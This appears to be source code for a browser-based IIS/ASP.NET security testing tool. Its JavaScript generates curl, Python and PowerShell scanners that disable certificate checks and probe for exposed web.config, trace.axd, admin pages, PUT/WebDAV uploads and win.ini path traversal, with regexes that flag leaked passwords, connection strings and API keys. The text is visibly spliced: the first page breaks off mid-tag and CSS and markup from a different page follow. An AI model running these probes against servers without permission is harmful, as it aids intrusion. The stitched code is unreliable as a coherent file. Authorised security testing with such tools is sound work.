            const selected = getSelectedTests();
            if (selected.length === 0) {
                alert('Please select at least one test to generate commands.');
                return;
            }
            
            const targetUrl = document.getElementById('targetUrl').value;
            const proxyUrl = document.getElementById('proxyUrl').value;
            const format = document.getElementById('outputFormat').value;
            
            let output = '';
            
            switch (format) {
                case 'curl-pure':
                    output = generatePureCurl(selected, targetUrl, proxyUrl);
                    break;
                case 'python':
                    output = generatePythonScript(selected, targetUrl);
                    break;
                case 'powershell':
                    output = generatePowerShellScript(selected, targetUrl, proxyUrl);
                    break;
                default:
                    output = generatePureCurl(selected, targetUrl, proxyUrl);
            }
            
            document.getElementById('outputContent').textContent = output;
            document.getElementById('outputModal').classList.remove('hidden');
        }

        // Generate pure cURL commands
        function generatePureCurl(tests, targetUrl, proxyUrl) {
            const commands = tests.map(({ category, test }, index) => {
                let cmd = `curl -s -k -w "\\nStatus: %{http_code} | Time: %{time_total}s\\n"`;
                
                if (proxyUrl) cmd += ` --proxy ${proxyUrl}`;
                if (test.method && test.method !== 'GET') cmd += ` -X ${test.method}`;
                
                if (test.headers) {
                    Object.entries(test.headers).forEach(([key, value]) => {
                        cmd += ` -H "${key}: ${value}"`;
                    });
                }
                
                if (test.body) cmd += ` --data-raw "${test.body}"`;
                
                cmd += ` "${targetUrl}${test.path || '/'}"`;
                
                return `# ${index + 1}. ${test.name}\n${cmd}`;
            });
            
            return commands.join('\n\n');
        }

        // Generate Python script
        function generatePythonScript(tests, targetUrl) {
            return `#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

target = "${targetUrl}"
session = requests.Session()
session.verify = False

tests = [
${tests.map(({ category, test }) => `    ("${test.name}", "${test.method || 'GET'}", "${test.path || '/'}", ${JSON.stringify(test.headers || {})}, ${test.body ? `"${test.body}"` : 'None'})`).join(',\n')}
]

for name, method, path, headers, body in tests:
    print(f"Testing: {name}")
    try:
        r = session.request(method, target + path, headers=headers, data=body)
        print(f"  Status: {r.status_code}")
    except Exception as e:
        print(f"  Error: {e}")
`;
        }

        // Generate PowerShell script (basic)
        function generatePowerShellScript(tests, targetUrl, proxyUrl) {
            return tests.map(({ category, test }, index) => {
                return `# Test ${index + 1}: ${test.name}
Write-Host "Testing: ${test.name}" -ForegroundColor Yellow
try {
    $response = Invoke-WebRequest -Uri "${targetUrl}${test.path || '/'}" -Method "${test.method || 'GET'}" -UseBasicParsing
    Write-Host "Status: $($response.StatusCode)" -ForegroundColor Green
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
`;
            }).join('\n');
        }

        // Advanced PowerShell Scanner Generator
        function generatePowerShellAdvanced() {
            const selected = getSelectedTests();
            if (selected.length === 0) {
                alert('Please select at least one test to generate PowerShell scanner.');
                return;
            }
            
            const targetUrl = document.getElementById('targetUrl').value;
            const proxyUrl = document.getElementById('proxyUrl').value;
            
            const script = `<#
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║    🛡️  ADVANCED IIS SECURITY SCANNER - PowerShell Edition                   ║
║    Version: 2.0 | Non-Admin | Detailed Analysis                              ║
║                                                                               ║
║    Target: ${targetUrl}                                                      ║
║    Tests: ${selected.length}                                                 ║
║    Generated: ${new Date().toISOString()}                                    ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝

INSTRUCTIONS:
1. Copy this entire script
2. Open PowerShell (no admin required)
3. Paste and press Enter
4. Review the detailed vulnerability analysis

#>

# Disable SSL/TLS certificate validation
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Configuration
$Target = "${targetUrl}"
${proxyUrl ? `$Proxy = "${proxyUrl}"` : '# No proxy configured'}
$Results = @()
$Vulnerabilities = @()
$StartTime = Get-Date

# Color functions
function Write-Success { param($Text) Write-Host $Text -ForegroundColor Green }
function Write-Warning { param($Text) Write-Host $Text -ForegroundColor Yellow }
function Write-Error { param($Text) Write-Host $Text -ForegroundColor Red }
function Write-Info { param($Text) Write-Host $Text -ForegroundColor Cyan }
function Write-Critical { param($Text) Write-Host $Text -ForegroundColor Magenta }

# Print banner
Write-Host ""
Write-Info "╔═══════════════════════════════════════════════════════════════════════════════╗"
Write-Info "║                    🛡️  IIS ADVANCED SECURITY SCANNER                        ║"
Write-Info "╚═══════════════════════════════════════════════════════════════════════════════╝"
Write-Host ""
Write-Info "🎯 Target: $Target"
Write-Info "🧪 Total Tests: ${selected.length}"
Write-Info "📅 Scan Started: $StartTime"
Write-Host ""
Write-Host "═══════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
Write-Host ""

# Analysis Functions
function Analyze-Response {
    param(
        [PSCustomObject]$Response,
        [string]$TestName,
        [string]$Severity,
        [string]$Method,
        [string]$Path
    )
    
    $Analysis = @{
        Vulnerable = $false
        Indicators = @()
        Risk = "None"
        Recommendations = @()
    }
    
    # Check status code patterns
    if ($Response.StatusCode -eq 200) {
        switch -Wildcard ($Path) {
            "*/web.config*" { 
                $Analysis.Vulnerable = $true
                $Analysis.Indicators += "⚠️ Configuration file accessible!"
                $Analysis.Risk = "CRITICAL"
                $Analysis.Recommendations += "Restrict access to configuration files"
            }
            "*/*.asp*" {
                if ($Method -eq "PUT") {
                    $Analysis.Vulnerable = $true
                    $Analysis.Indicators += "⚠️ File upload may be possible!"
                    $Analysis.Risk = "CRITICAL"
                    $Analysis.Recommendations += "Disable PUT method"
                }
            }
            "*/trace.axd*" {
                $Analysis.Vulnerable = $true
                $Analysis.Indicators += "⚠️ ASP.NET trace information exposed!"
                $Analysis.Risk = "HIGH"
                $Analysis.Recommendations += "Disable trace.axd in production"
            }
            "*/iisadmin/*" {
                $Analysis.Vulnerable = $true
                $Analysis.Indicators += "⚠️ Admin interface accessible!"
                $Analysis.Risk = "CRITICAL"
                $Analysis.Recommendations += "Remove or restrict admin interfaces"
            }
            "*win.ini*" {
                $Analysis.Vulnerable = $true
                $Analysis.Indicators += "⚠️ Path traversal vulnerability confirmed!"
                $Analysis.Risk = "CRITICAL"
                $Analysis.Recommendations += "Apply security patches immediately"
            }
        }
    }
    
    # Check headers for information disclosure
    if ($Response.Headers) {
        if ($Response.Headers["Server"]) {
            $Analysis.Indicators += "Server: $($Response.Headers["Server"])"
            if ($Response.Headers["Server"] -match "IIS") {
                $Analysis.Indicators += "IIS version detected in headers"
            }
        }
        if ($Response.Headers["X-Powered-By"]) {
            $Analysis.Indicators += "X-Powered-By: $($Response.Headers["X-Powered-By"])"
            $Analysis.Indicators += "Technology stack exposed"
        }
        if ($Response.Headers["X-AspNet-Version"]) {
            $Analysis.Indicators += "ASP.NET Version: $($Response.Headers["X-AspNet-Version"])"
            $Analysis.Indicators += "Framework version exposed"
        }
        if ($Response.Headers["Allow"] -and $Method -eq "OPTIONS") {
            $Analysis.Indicators += "Allowed Methods: $($Response.Headers["Allow"])"
            if ($Response.Headers["Allow"] -match "(PUT|DELETE|MOVE|PROPFIND)") {
                $Analysis.Vulnerable = $true
                $Analysis.Indicators += "⚠️ Dangerous HTTP methods enabled!"
                $Analysis.Risk = "HIGH"
                $Analysis.Recommendations += "Disable unnecessary HTTP methods"
            }
        }
    }
    
    # Check response content patterns
    if ($Response.Content) {
        $ContentPreview = $Response.Content.Substring(0, [Math]::Min(500, $Response.Content.Length))
        
        # Check for error messages
        if ($ContentPreview -match "Microsoft|IIS|ASP\.NET|\.NET Framework") {
            $Analysis.Indicators += "IIS/ASP.NET signatures found in response"
        }
        
        # Check for sensitive data patterns
        if ($ContentPreview -match "(password|connectionString|apiKey|secret)") {
            $Analysis.Vulnerable = $true
            $Analysis.Indicators += "⚠️ Potential sensitive data exposure!"
            $Analysis.Risk = "HIGH"
        }
        
        # Check for stack traces
        if ($ContentPreview -match "(at System\.|Exception|StackTrace)") {
            $Analysis.Vulnerable = $true
            $Analysis.Indicators += "⚠️ Stack trace information exposed!"
            $Analysis.Risk = "MEDIUM"
            $Analysis.Recommendations += "Disable detailed error messages"
        }
    }
    
    # Special checks for specific vulnerabilities
    if ($TestName -match "ViewState" -and $Response.StatusCode -ne 500) {
        $Analysis.Indicators += "ViewState processing active"
        if ($Severity -eq "critical") {
            $Analysis.Recommendations += "Ensure ViewState MAC validation is enabled"
        }
    }
    
    if ($TestName -match "WebDAV" -and $Response.StatusCode -ne 405) {
        if ($Method -eq "OPTIONS" -and $Response.StatusCode -eq 200) {
            $Analysis.Vulnerable = $true
            $Analysis.Indicators += "⚠️ WebDAV appears to be enabled!"
            $Analysis.Risk = "HIGH"
            $Analysis.Recommendations += "Disable WebDAV if not required"
        }
    }
    
    return $Analysis
}

# Test Execution Function
function Execute-Test {
    param(
        [string]$TestName,
        [string]$Description,
        [string]$Method,
        [string]$Path,
        [hashtable]$Headers,
        [string]$Body,
        [string]$Severity,
        [string]$Category,
        [int]$TestNumber,
        [int]$TotalTests
    )
    
    Write-Host "[$('{0:D2}' -f $TestNumber)/$TotalTests] " -NoNewline -ForegroundColor DarkGray
    
    # Severity color coding
    $SeverityColor = switch ($Severity) {
        "critical" { "Red" }
        "high" { "Yellow" }
        "medium" { "Cyan" }
        "low" { "Green" }
        default { "White" }
    }
    
    Write-Host "[$($Severity.ToUpper())]" -ForegroundColor $SeverityColor -NoNewline
    Write-Host " $TestName" -ForegroundColor White
    Write-Host "      Category: $Category" -ForegroundColor DarkGray
    Write-Host "      Method: $Method | Path: $Path" -ForegroundColor DarkGray
    
    $Uri = "$Target$Path"
    $TestResult = @{
        TestName = $TestName
        Description = $Description
        Category = $Category
        Severity = $Severity
        Method = $Method
        Path = $Path
        Uri = $Uri
        Timestamp = Get-Date
    }
    
    try {
        # Prepare request parameters
        $RequestParams = @{
            Uri = $Uri
            Method = $Method
            UseBasicParsing = $true
            TimeoutSec = 30
            ErrorAction = 'Stop'
        }
        
        # Add proxy if configured
        ${proxyUrl ? '$RequestParams.Proxy = $Proxy' : ''}
        
        # Add headers if provided
        if ($Headers -and $Headers.Count -gt 0) {
            $RequestParams.Headers = $Headers
        }
        
        # Add body if provided
        if ($Body) {
            $RequestParams.Body = $Body
        }
        
        # Execute request
        $Response = Invoke-WebRequest @RequestParams
        
        $TestResult.StatusCode = $Response.StatusCode
        $TestResult.Success = $true
        $TestResult.ResponseTime = (Get-Date) - $TestResult.Timestamp
        $TestResult.ResponseSize = $Response.RawContent.Length
        
        # Perform vulnerability analysis
        $Analysis = Analyze-Response -Response $Response -TestName $TestName -Severity $Severity -Method $Method -Path $Path
        $TestResult.Analysis = $Analysis
        
        # Display results
        Write-Host "      ✓ Status: " -NoNewline -ForegroundColor Green
        Write-Host "$($Response.StatusCode)" -NoNewline
        Write-Host " | Size: $($Response.RawContent.Length) bytes" -ForegroundColor DarkGray
        
        # Show vulnerability indicators
        if ($Analysis.Vulnerable) {
            Write-Critical "      🚨 VULNERABILITY DETECTED! Risk Level: $($Analysis.Risk)"
            $global:Vulnerabilities += $TestResult
            
            foreach ($indicator in $Analysis.Indicators) {
                if ($indicator -match "⚠️") {
                    Write-Warning "         $indicator"
                } else {
                    Write-Info "         • $indicator"
                }
            }
            
            if ($Analysis.Recommendations.Count -gt 0) {
                Write-Host "      📋 Recommendations:" -ForegroundColor Magenta
                foreach ($rec in $Analysis.Recommendations) {
                    Write-Host "         → $rec" -ForegroundColor DarkMagenta
                }
            }
        } elseif ($Analysis.Indicators.Count -gt 0) {
            foreach ($indicator in $Analysis.Indicators | Select-Object -First 3) {
                Write-Info "         • $indicator"
            }
        }
        
    } catch {
        $TestResult.Success = $false
        $TestResult.Error = $_.Exception.Message
        
        if ($_.Exception.Response) {
            $TestResult.StatusCode = [int]$_.Exception.Response.StatusCode
            Write-Host "      ✗ Status: " -NoNewline -ForegroundColor Yellow
            Write-Host "$([int]$_.Exception.Response.StatusCode)" -NoNewline
            
            # Analyze error responses
            if ($TestResult.StatusCode -eq 404) {
                Write-Host " - Resource not found" -ForegroundColor DarkGray
            } elseif ($TestResult.StatusCode -eq 403) {
                Write-Warning "      ⚠ Access forbidden - may indicate presence of resource"
            } elseif ($TestResult.StatusCode -eq 401) {
                Write-Warning "      ⚠ Authentication required - resource exists"
            } elseif ($TestResult.StatusCode -eq 405) {
                Write-Info "      ℹ Method not allowed"
            } elseif ($TestResult.StatusCode -eq 500) {
                Write-Warning "      ⚠ Internal server error - potential vulnerability"
                $TestResult.Analysis = @{
                    Indicators = @("Server error may indicate input validation issues")
                    Risk = "MEDIUM"
                }
            }
        } else {
            Write-Error "      ✗ Error: $($_.Exception.Message)"
        }
    }
    
    $global:Results += $TestResult
    Write-Host ""
    
    return $TestResult
}

# Define all tests
$Tests = @(
${selected.map(({ category, test }, index) => {
    const headers = test.headers ? '@{' + Object.entries(test.headers).map(([k, v]) => `"${k}"="${v}"`).join('; ') + '}' : '@{}';
    const body = test.body ? `"${test.body.replace(/"/g, '`"')}"` : '$null';
    return `    @{
        Name = "${test.name}"
        Description = "${test.description}"
        Method = "${test.method || 'GET'}"
        Path = "${test.path || '/'}"
        Headers = ${headers}
        Body = ${body}
        Severity = "${test.severity}"
        Category = "${category}"
    }`;
}).join(',\n')}
)

# Execute all tests
Write-Info "🚀 Starting IIS Security Assessment..."
Write-Host ""

$TestNumber = 1
foreach ($Test in $Tests) {
    Execute-Test -TestName $Test.Name \`
                 -Description $Test.Description \`
                 -Method $Test.Method \`
                 -Path $Test.Path \`
                 -Headers $Test.Headers \`
                 -Body $Test.Body \`
                 -Severity $Test.Severity \`
                 -Category $Test.Category \`
                 -TestNumber $TestNumber \`
                 -TotalTests $Tests.Count
    
    $TestNumber++
    Start-Sleep -Milliseconds 100  # Small delay between requests
}

# Generate Summary Report
Write-Host "═══════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
Write-Host ""
Write-Info "📊 SECURITY ASSESSMENT SUMMARY"
Write-Host ""

$EndTime = Get-Date
$Duration = $EndTime - $StartTime

Write-Host "🎯 Target: " -NoNewline; Write-Success $Target
Write-Host "⏱️  Duration: " -NoNewline; Write-Info "$($Duration.TotalSeconds.ToString('F2')) seconds"
Write-Host "📋 Tests Executed: " -NoNewline; Write-Info $Tests.Count
Write-Host "✅ Successful Tests: " -NoNewline; Write-Success ($global:Results | Where-Object { $_.Success }).Count
Write-Host "❌ Failed Tests: " -NoNewline; Write-Warning ($global:Results | Where-Object { -not $_.Success }).Count

Write-Host ""

# Vulnerability Summary
if ($global:Vulnerabilities.Count -gt 0) {
    Write-Critical "🚨 VULNERABILITIES DETECTED: $($global:Vulnerabilities.Count)"
    Write-Host ""
    
    # Group by severity
    $CriticalVulns = $global:Vulnerabilities | Where-Object { $_.Severity -eq "critical" }
    $HighVulns = $global:Vulnerabilities | Where-Object { $_.Severity -eq "high" }
    $MediumVulns = $global:Vulnerabilities | Where-Object { $_.Severity -eq "medium" }
    
    if ($CriticalVulns.Count -gt 0) {
        Write-Error "🔴 CRITICAL ($($CriticalVulns.Count)):"
        foreach ($vuln in $CriticalVulns) {
            Write-Host "   • $($vuln.TestName)" -ForegroundColor Red
            Write-Host "     Path: $($vuln.Path)" -ForegroundColor DarkRed
        }
        Write-Host ""
    }
    
    if ($HighVulns.Count -gt 0) {
        Write-Warning "🟠 HIGH ($($HighVulns.Count)):"
        foreach ($vuln in $HighVulns) {
            Write-Host "   • $($vuln.TestName)" -ForegroundColor Yellow
            Write-Host "     Path: $($vuln.Path)" -ForegroundColor DarkYellow
        }
        Write-Host ""
    }
    
    if ($MediumVulns.Count -gt 0) {
        Write-Info "🟡 MEDIUM ($($MediumVulns.Count)):"
        foreach ($vuln in $MediumVulns) {
            Write-Host "   • $($vuln.TestName)" -ForegroundColor Cyan
        }
        Write-Host ""
    }
    
    Write-Host ""
    Write-Critical "⚠️  IMMEDIATE ACTION REQUIRED!"
    Write-Host ""
    Write-Host "Top Recommendations:" -ForegroundColor Magenta
    
    # Collect unique recommendations
    $AllRecommendations = @()
    foreach ($vuln in $global:Vulnerabilities) {
        if ($vuln.Analysis.Recommendations) {
            $AllRecommendations += $vuln.Analysis.Recommendations
        }
    }
    
    $UniqueRecommendations = $AllRecommendations | Select-Object -Unique | Select-Object -First 5
    $RecNumber = 1
    foreach ($rec in $UniqueRecommendations) {
        Write-Host "  $RecNumber. $rec" -ForegroundColor DarkMagenta
        $RecNumber++
    }
    
} else {
    Write-Success "✅ No critical vulnerabilities detected"
    Write-Host ""
    Write-Info "However, always review the detailed results above for potential issues."
}

Write-Host ""

# Export results to file
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$ReportFile = "IIS_Security_Report_$Timestamp.json"
$ReportPath = Join-Path $env:TEMP $ReportFile

$ExportData = @{
    Target = $Target
    ScanDate = $StartTime
    Duration = $Duration.TotalSeconds
    TotalTests = $Tests.Count
    Vulnerabilities = $global:Vulnerabilities
    Results = $global:Results
}

try {
    $ExportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath -Encoding UTF8
    Write-Success "📄 Detailed report saved to: $ReportPath"
} catch {
    Write-Warning "Could not save report to file"
}

Write-Host ""
Write-Host "═══════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
Write-Info "🏁 Scan Complete!"

# Final status
if ($global:Vulnerabilities.Count -gt 0) {
    Write-Host ""
    Write-Critical "⚠️  Your IIS server has $($global:Vulnerabilities.Count) security issues that need attention!"
    exit 1
} else {
    Write-Host ""
    Write-Success "✅ Basic security scan completed. Review results for optimization opportunities."
    exit 0
}
`;
            
            document.getElementById('powershellContent').textContent = script;
            document.getElementById('powershellModal').classList.remove('hidden');
        }

        // Copy PowerShell script
        function copyPowerShell() {
            const content = document.getElementById('powershellContent').textContent;
            navigator.clipboard.writeText(content).then(() => {
                const btn = event.target.closest('button');
                const originalText = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check mr-2"></i>Copied!';
                setTimeout(() => {
                    btn.innerHTML = originalText;
                }, 2000);
            });
        }

        // Download PowerShell script
        function downloadPowerShell() {
            const content = document.getElementById('powershellContent').textContent;
            const timestamp = new Date().getTime();
            const filename = `IIS_Security_Scanner_${timestamp}.ps1`;
            
            const blob = new Blob([content], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.click();
            window.URL.revokeObjectURL(url);
        }

        // Close PowerShell modal
        function closePowerShellModal() {
            document.getElementById('powershellModal').classList.add('hidden');
        }

        // Copy commands
        function copyCommands() {
            const content = document.getElementById('outputContent').textContent;
            navigator.clipboard.writeText(content);
        }

        // Download commands
        function downloadCommands() {
            const content = document.getElementById('outputContent').textContent;
            const format = document.getElementById('outputFormat').value;
            const timestamp = new Date().getTime();
            const filename = `iis_tests_${timestamp}.txt`;
            
            const blob = new Blob([content], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.click();
            window.URL.revokeObjectURL(url);
        }

        // Close modal
        function closeModal() {
            document.getElementById('outputModal').classList.add('hidden');
        }

        // Show help
        function showHelp() {
            alert(`🛡️ Advanced IIS Security Testing Suite Pro v2.0

This tool generates comprehensive security tests for IIS servers.

FEATURES:
✅ Advanced PowerShell Scanner with detailed vulnerability analysis
✅ Real vulnerability detection beyond status codes
✅ Non-admin execution support
✅ Multiple output formats
✅ Detailed reporting

HOW TO USE POWERSHELL SCANNER:
1. Select tests you want to run
2. Click "PowerShell Scanner" button
3. Copy the generated script
4. Open PowerShell (no admin needed)
5. Paste and run
6. Review detailed vulnerability analysis

⚠️ ETHICAL USE ONLY:
Only test systems you own or have permission to test.`);
        }

        // Initialize on load
        document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</htm        }

        .severity-info {
            background: #f0f9ff;
            color: #0284c7;
            border: 1px solid #bae6fd;
        }

        .code-block {
            background: #0f172a;
            color: #e2e8f0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.5;
            padding: 16px;
            border-radius: 8px;
            overflow-x: auto;
            position: relative;
            border: 1px solid #1e293b;
        }

        .code-block .cmd {
            color: #22d3ee;
        }

        .code-block .url {
            color: #a78bfa;
        }

        .code-block .param {
            color: #fbbf24;
        }

        .copy-btn {
            position: absolute;
            top: 8px;
            right: 8px;
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.3);
            color: #3b82f6;
            padding: 6px 10px;
            border-radius: 4px;
            font-size: 11px;
            cursor: pointer;
            opacity: 0;
            transition: all 0.2s ease;
        }

        .code-block:hover .copy-btn {
            opacity: 1;
        }

        .copy-btn:hover {
            background: rgba(59, 130, 246, 0.2);
        }

        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 16px;
            border-radius: 6px;
            font-weight: 500;
            font-size: 14px;
            border: none;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
        }

        .btn-primary {
            background: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background: #2563eb;
            transform: translateY(-1px);
        }

        .btn-secondary {
            background: white;
            color: #475569;
            border: 1px solid #d1d5db;
        }

        .btn-secondary:hover {
            background: #f8fafc;
            border-color: #9ca3af;
        }

        .btn-success {
            background: var(--success);
            color: white;
        }

        .btn-success:hover {
            background: #059669;
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 32px;
        }

        .stat-card {
            background: white;
            padding: 24px;
            border-radius: 12px;
            border: 1px solid #e2e8f0;
            text-align: center;
            transition: all 0.2s ease;
        }

        .stat-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
        }

        .filter-chip {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 8px 16px;
            background: #f1f5f9;
            border: 1px solid #e2e8f0;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .filter-chip:hover {
            background: #e2e8f0;
        }

        .filter-chip.active {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
        }

        .category-section {
            margin-bottom: 3rem;
        }

        .category-header {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 2px solid #e2e8f0;
        }

        .category-icon {
            width: 56px;
            height: 56px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 16px 20px;
            border-radius: 8px;
            color: white;
            font-weight: 500;
            z-index: 1000;
            transform: translateX(100%);
            transition: transform 0.3s ease;
        }

        .notification.show {
            transform: translateX(0);
        }

        .notification.success { background: var(--success); }
        .notification.error { background: var(--danger); }
        .notification.info { background: var(--info); }
        .notification.warning { background: var(--warning); }

        .progress-ring {
            width: 40px;
            height: 40px;
        }

        .progress-ring circle {
            fill: none;
            stroke-width: 4;
            stroke-linecap: round;
            transform-origin: 50% 50%;
            transform: rotate(-90deg);
        }

        .progress-ring .bg {
            stroke: #e5e7eb;
        }

        .progress-ring .progress {
            stroke: var(--primary);
            stroke-dasharray: 0 100;
            transition: stroke-dasharray 0.3s ease;
        }

        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .test-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="max-w-7xl mx-auto px-6">
            <div class="flex items-center justify-between">
                <div>
                    <h1 class="text-3xl font-bold mb-2">ASP.NET Security Testing Framework</h1>
                    <p class="text-xl text-slate-300">Professional Edition - Comprehensive Vulnerability Assessment</p>
                </div>
                <div class="flex items-center gap-4">
                    <div class="bg-white/10 backdrop-blur-sm rounded-lg px-4 py-2">
                        <div class="flex items-center gap-2">
                            <div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                            <span>Ready</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="max-w-7xl mx-auto px-6 py-8">
        
        <!-- Configuration Panel -->
        <div class="card p-6 mb-8">
            <h2 class="text-xl font-semibold mb-4">Target Configuration</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4 mb-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Target URL</label>
                    <input type="text" id="targetUrl" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="https://target.com" value="https://target.com">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Framework</label>
                    <select id="framework" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500">
                        <option value="webforms">Web Forms</option>
                        <option value="mvc">MVC</option>
                        <option value="core">ASP.NET Core</option>
                        <option value="blazor">Blazor</option>
                        <option value="api">Web API</option>
                    </select>
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Authentication</label>
                    <input type="text" id="authCookie" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500" placeholder="ASP.NET_SessionId=...">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Scan Mode</label>
                    <select id="scanMode" class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500">
                        <option value="safe">Safe</option>
                        <option value="normal">Normal</option>
                        <option value="aggressive">Aggressive</option>
                    </select>
                </div>
                <div class="flex items-end">
                    <button class="btn btn-primary w-full" onclick="testConnection()">
                        <i class="fas fa-link"></i>
                        Test Connection
                    </button>
                </div>
            </div>
        </div>

        <!-- Statistics -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="text-3xl font-bold text-red-600 mb-2" id="criticalCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">Critical</div>
            </div>
            <div class="stat-card">
                <div class="text-3xl font-bold text-orange-600 mb-2" id="highCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">High</div>
            </div>
            <div class="stat-card">
                <div class="text-3xl font-bold text-yellow-600 mb-2" id="mediumCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">Medium</div>
            </div>
            <div class="stat-card">
                <div class="text-3xl font-bold text-green-600 mb-2" id="lowCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">Low</div>
            </div>
            <div class="stat-card">
                <div class="text-3xl font-bold text-blue-600 mb-2" id="selectedCount">0</div>
                <div class="text-sm text-gray-600 uppercase tracking-wide">Selected</div>
            </div>
        </div>

        <!-- Controls -->
        <div class="card p-6 mb-8">
            <div class="flex flex-wrap items-center justify-between gap-4">
                <div class="flex flex-wrap gap-3">
                    <button class="btn btn-primary" onclick="selectCritical()">
                        <i class="fas fa-exclamation-triangle"></i>
                        Critical Only
                    </button>
                    <button class="btn btn-primary" onclick="selectAll()">
                        <i class="fas fa-check-double"></i>
                        Select All
                    </button>
                    <button class="btn btn-secondary" onclick="deselectAll()">
                        <i class="fas fa-times"></i>
                        Clear All
                    </button>
                    <button class="btn btn-success" onclick="exportScript()">
                        <i class="fas fa-download"></i>
                        Export PowerShell
                    </button>
                    <button class="btn btn-danger" onclick="runScan()" id="scanBtn">
                        <i class="fas fa-play"></i>
                        Start Scan
                    </button>
                </div>
                
                <div class="flex flex-wrap gap-2">
                    <div class="filter-chip active" data-filter="all" onclick="filterTests('all')">
                        All <span class="bg-white/20 rounded-full px-2 text-xs" id="allCount">0</span>
                    </div>
                    <div class="filter-chip" data-filter="critical" onclick="filterTests('critical')">
                        Critical <span class="bg-white/20 rounded-full px-2 text-xs" id="criticalFilterCount">0</span>
                    </div>
                    <div class="filter-chip" data-filter="high" onclick="filterTests('high')">
                        High <span class="bg-white/20 rounded-full px-2 text-xs" id="highFilterCount">0</span>
                    </div>
                    <div class="filter-chip" data-filter="medium" onclick="filterTests('medium')">
                        Medium <span class="bg-white/20 rounded-full px-2 text-xs" id="mediumFilterCount">0</span>
                    </div>
                    <div class="filter-chip" data-filter="low" onclick="filterTests('low')">
                        Low <span class="bg-white/20 rounded-full px-2 text-xs" id="lowFilterCount">0</span>
                    </div>
                </div>
            </div>
            
            <div class="mt-4">
                <input type="text" id="searchInput" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500" placeholder="Search tests, CVEs, techniques..." onkeyup="searchTests()">
            </div>
        </div>

        <!-- Test Categories -->
        <div id="testCategories"></div>
    </div>

    <!-- Export Modal -->
    <div id="exportModal" class="fixed inset-0 bg-black/50 hidden z-50 flex items-center justify-center p-4">
        <div class="bg-white rounded-lg w-full max-w-4xl max-h-[90vh] flex flex-col">
            <div class="p-6 border-b">
                <div class="flex justify-between items-center">
                    <h3 class="text-xl font-semibold">Generated PowerShell Script</h3>
                    <button onclick="closeModal()" class="text-gray-400 hover:text-gray-600">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
            </div>
            <div class="p-6 flex-1 overflow-auto">
                <div class="flex gap-3 mb-4">
                    <button class="btn btn-primary" onclick="copyScript()">
                        <i class="fas fa-copy"></i>
                        Copy Script
                    </button>
                    <button class="btn btn-secondary" onclick="downloadScript()">
                        <i class="fas fa-download"></i>
                        Download
                    </button>
                </div>
                <div class="code-block">
                    <pre id="scriptOutput"></pre>
                </div>
            </div>
